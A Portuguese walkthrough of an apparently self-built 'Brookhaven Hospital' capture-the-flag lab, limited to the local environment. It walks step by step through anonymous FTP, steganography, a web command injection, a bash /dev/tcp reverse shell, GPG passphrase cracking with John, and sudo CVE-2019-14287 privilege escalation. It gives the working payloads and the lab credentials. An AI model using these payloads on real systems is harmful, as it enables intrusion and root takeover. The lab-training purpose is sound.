# Walkthrough - Brookhaven Hospital CTF

> Utilize os comandos somente contra o ambiente local criado por este projeto.

## Cadeia completa

FTP anônimo -> esteganografia -> login web -> command injection autenticada ->
shell `www-data` -> `/maintenance-access.gpg` -> ataque de dicionário ->
credenciais SSH -> usuário `james` -> CVE-2019-14287 -> root.

## 1. Enumeração

```bash
nmap -sC -sV -p- 127.0.0.1
```

Serviços esperados:

- `21/tcp`: FTP;
- `22/tcp`: SSH;
- `80/tcp`: HTTP.

## 2. FTP e esteganografia

```bash
ftp 127.0.0.1
```

Utilize o usuário `anonymous`, liste os arquivos e baixe a imagem preparada:

```ftp
binary
ls
get README.txt
get mary.jpg
quit
```

Extraia o memorando escondido. A passphrase planejada para o `steghide` é
`room312`:

```bash
steghide extract -sf mary.jpg -p room312
cat credentials.txt
```

Credenciais esperadas:

```text
Username: archives
Password: M4ry_1s_W41t1ng
```

## 3. Login web

Acesse:

```text
http://127.0.0.1/login.php
```

Entre com as credenciais recuperadas da imagem.

## 4. Command injection autenticada

No painel, abra **Generate reports**. O campo **Renderer profile** é concatenado
em um comando de shell sem validação adequada.

Teste:

```text
clinical; id
```

A saída deve conter:

```text
uid=33(www-data)
```

## 5. Reverse shell

Descubra o gateway da rede Docker no host:

```bash
docker exec silenthill sh -c "ip route | awk '/default/ {print \$3}'"
```

Abra um listener:

```bash
nc -lvnp 4444
```

Use o endereço retornado no campo vulnerável, por exemplo:

```text
clinical; bash -c 'bash -i >& /dev/tcp/172.18.0.1/4444 0>&1'
```

Confirme o usuário:

```bash
id
whoami
```

## 6. Arquivo GPG

Localize arquivos GPG legíveis:

```bash
find / -type f -name '*.gpg' -readable 2>/dev/null
```

O arquivo esperado é:

```text
/maintenance-access.gpg
```

Consulte a pista:

```bash
cat /opt/brookhaven/archive/README.txt
ls -l /maintenance-access.gpg
```

Transfira o arquivo. Uma alternativa compatível com shell simples é Base64:

```bash
base64 -w0 /maintenance-access.gpg
```

Reconstrua o arquivo:

```bash
echo 'BASE64_COPIADO' | base64 -d > maintenance-access.gpg
file maintenance-access.gpg
```

## 7. Quebra da passphrase e credenciais SSH

Caso a wordlist esteja compactada:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Converta e ataque o arquivo:

```bash
gpg2john maintenance-access.gpg > maintenance.hash
john --wordlist=/usr/share/wordlists/rockyou.txt maintenance.hash
john --show maintenance.hash
```

Passphrase esperada:

```text
promise
```

Descriptografe:

```bash
gpg --decrypt maintenance-access.gpg
```

Credenciais esperadas:

```text
Username: james
Password: L4k3v13w_312#Archive
```

## 8. SSH e user flag

```bash
ssh james@127.0.0.1
cat ~/user.txt
```

## 9. Enumeração da escalada

```bash
sudo --version | head -n 1
sudo -l
```

Resultados esperados:

```text
Sudo version 1.8.27
```

```text
(ALL, !root) NOPASSWD: /usr/bin/vim
```

A regra permite executar o Vim como qualquer usuário, exceto `root`. Entretanto,
o Sudo 1.8.27 é vulnerável à CVE-2019-14287: o UID especial `-1` contorna a
exclusão `!root` e é tratado como UID 0 na execução.

## 10. Exploração da CVE-2019-14287

```bash
sudo -u#-1 /usr/bin/vim
```

Dentro do Vim:

```vim
:set shell=/bin/bash
:shell
```

Confirme a escalada e leia a flag final:

```bash
id
whoami
cat /root/root.txt
```

Resultado esperado:

```text
uid=0(root) gid=0(root)
root
```
